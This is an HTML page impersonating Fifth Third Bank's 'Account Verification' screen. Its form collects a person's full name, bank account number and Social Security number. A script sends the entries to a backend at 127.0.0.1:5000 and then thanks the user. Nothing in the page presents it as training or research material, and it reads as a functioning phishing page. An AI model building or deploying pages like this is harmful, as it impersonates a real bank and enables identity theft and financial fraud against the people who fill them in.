<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Details | Fifth Third Bank</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700">
    <style>
        body {
            background: #1a357a;
            background: linear-gradient(135deg, #1a357a 0%, #2b4fa2 100%);
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            min-height: 100vh;
        }
        .header {
            background: #fff;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #eee;
            height: 80px;
        }
        .header-left {
            display: flex;
            align-items: center;
            margin-left: 40px;
        }
        .header img {
            height: 48px;
        }
        .header .bank-name {
            font-size: 1.2rem;
            font-weight: 700;
            color: #1a357a;
            margin-left: 16px;
            letter-spacing: 1px;
        }
        .header .links {
            margin-right: 40px;
            color: #444;
            font-size: 15px;
            display: flex;
            align-items: center;
            gap: 24px;
            opacity: 0.8;
        }
        .breadcrumb {
            color: #fff;
            font-size: 15px;
            margin: 32px 0 0 13vw;
            letter-spacing: 0.5px;
        }
        .breadcrumb a {
            color: #fff;
            text-decoration: underline;
            opacity: 0.85;
        }
        .details-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 50vh;
            margin-top: 8px;
        }
        .details-box {
            background: #f7f7f7;
            max-width: 340px;
            width: 100%;
            border-radius: 8px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
            padding: 28px 20px 24px 20px;
            margin-top: 0;
        }
        .details-box h2 {
            margin-top: 0;
            color: #222;
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 14px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: #222;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #bbb;
            border-radius: 4px;
            font-size: 1rem;
            box-sizing: border-box;
        }
        .btn {
            width: 100%;
            background: #1a357a;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:active {
            background: #16306a;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <img src="53rd.logo.png" alt="Fifth Third Bank Logo">
            <span class="bank-name">FIFTH THIRD</span>
        </div>
        <div class="links">
            CUSTOMER SERVICE
            <span>|</span>
            BRANCH & ATM LOCATOR
        </div>
    </div>
    <div class="breadcrumb">
        <a href="#">Home</a> &gt; <b>Account Details</b>
    </div>
    <div class="details-container">
        <form class="details-box" id="detailsForm" method="POST" action="/details" autocomplete="off">
            <h2>Account Verification</h2>
            <div class="form-group">
                <label for="name">Full Name</label>
                <input type="text" id="name" name="name" required>
            </div>
            <div class="form-group">
                <label for="account">Account Number</label>
                <input type="text" id="account" name="account" required>
            </div>
            <div class="form-group">
                <label for="ssn">SSN</label>
                <input type="text" id="ssn" name="ssn" required maxlength="11" placeholder="XXX-XX-XXXX">
            </div>
            <button class="btn" type="submit">Continue</button>
        </form>
    </div>
    <script>
        document.getElementById('detailsForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const form = e.target;
            const formData = new FormData(form);
            try {
                const resp = await fetch('http://127.0.0.1:5000/details', {
                    method: 'POST',
                    body: formData
                });
                const data = await resp.json();
                if (data.success) {
                    alert('Your details have been submitted successfully. Thank you!');
                    form.reset();
                    // Optionally, redirect to a thank you page:
                    // window.location.href = '/thankyou.html';
                } else if (data.error) {
                    alert(data.error);
                } else {
                    alert('Submission failed.');
                }
            } catch (err) {
                alert('Network error.');
            }
        });
    </script>
</body>
</html>
